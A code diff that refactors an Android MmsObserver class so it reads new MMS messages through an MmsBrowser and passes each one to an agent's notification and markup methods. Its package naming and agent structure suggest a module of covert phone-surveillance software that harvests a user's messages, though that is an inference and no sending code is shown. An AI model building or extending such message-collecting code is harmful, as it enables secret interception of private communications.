@@ -10,7 +10,7 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.manager.ManagerAgent;
 import com.android.service.module.ModuleMessage;
-import com.android.service.module.sms.MmsBrowser;
+import com.android.service.module.message.MmsBrowser;
 import com.android.service.util.Check;
 
 import android.content.ContentResolver;
@@ -25,8 +25,6 @@ public class MmsObserver extends ContentObserver {
 	public MmsObserver(Handler handler) {
 		super(handler);
 	}
-	// TODO: serialize this value
-	int lastManagedId=0;
 
 	@Override
 	public void onChange(boolean bSelfChange) {
@@ -38,7 +36,7 @@ public class MmsObserver extends ContentObserver {
 		if (a == null) {
 			return;
 		}
-
+		int lastManagedId = a.getLastManagedMmsId();
 		final ContentResolver contentResolver = Status.getAppContext().getContentResolver();
 
 		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
@@ -57,59 +55,18 @@ public class MmsObserver extends ContentObserver {
 		 * "content://mms-sms" All SMS = "content://sms"
 		 */
 
-		final String[] projection = new String[]{"*"};
-		Uri uri = Uri.parse("content://mms-sms/conversations/");
-		Cursor cur = contentResolver.query(uri, projection, null, null, null);
+		final MmsBrowser mmsBrowser = new MmsBrowser();
+		final ArrayList<Mms> listMms = mmsBrowser.getMmsList(lastManagedId);
+		final Iterator<Mms> iterMms = listMms.listIterator();
 
-		boolean notifyMMS=false;
-		
-		while (cur.moveToNext()) {
-			  String string = cur.getString(cur.getColumnIndex("ct_t"));
-		        if ("application/vnd.wap.multipart.related".equals(string)) {
-		        	String id = cur.getString(cur.getColumnIndex("_id"));
-		        	if (Cfg.DEBUG) {
-						Check.log(TAG + " MMS id="+id);//$NON-NLS-1$
-					}
-		            // it's MMS
-		        	//onMmsSend(cur,id);
-		        	int intId = Integer.parseInt(id);
-		        	if(intId > lastManagedId){
-		        		notifyMMS=true;
-		        	}
-		        } else {
-		            // it's SMS
-		        	if (Cfg.DEBUG) {
-						Check.log(TAG + " SMS");//$NON-NLS-1$
-					}
-		        }
-
-			/*final String protocol = cur.getString(cur.getColumnIndex("protocol")); //$NON-NLS-1$
-
-			if (protocol != null) {
-				return;
-			}
-
-			final Sms s = onSmsSend(cur);
-			a.notification(s);*/
-		}
-		
-		if(notifyMMS){
-			final MmsBrowser mmsBrowser = new MmsBrowser();
-			final ArrayList<Mms> listMms = mmsBrowser.getMmsList(lastManagedId);
-			final Iterator<Mms> iterMms = listMms.listIterator();
-
-			while (iterMms.hasNext()) {
-				final Mms mms = iterMms.next();
-				mms.print();
-				a.notification(mms);
-				
-				lastManagedId=Math.max(mms.getId(), lastManagedId);
-			}
-			
-			 
+		while (iterMms.hasNext()) {
+			final Mms mms = iterMms.next();
+			mms.print();
+			a.notification(mms);
 		}
 
-		cur.close();
+		a.updateMarkupMMS(mmsBrowser.getMaxId());
+
 	}
 
 	private void onMmsSend(Cursor cur, String mmsId) {
